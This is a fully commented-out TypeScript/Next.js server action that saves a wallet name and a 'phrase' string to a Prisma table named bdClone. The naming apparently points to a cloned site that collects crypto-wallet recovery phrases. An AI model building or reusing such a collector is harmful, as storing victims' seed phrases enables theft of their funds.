// "use server";

// import prisma from "@/app/config/db";

// export const savToDB = async (title: any, data: string) => {
//   try {
//     const newWallet: any = {
//       wallet: title,
//       phrase: data,
//     };

//     const result = await prisma.bdClone.create({
//       data: newWallet,
//     });

//     return {
//       data: result,
//     };
//   } catch (error: any) {
//     return {
//       error: error.message,
//     };
//   }
// };


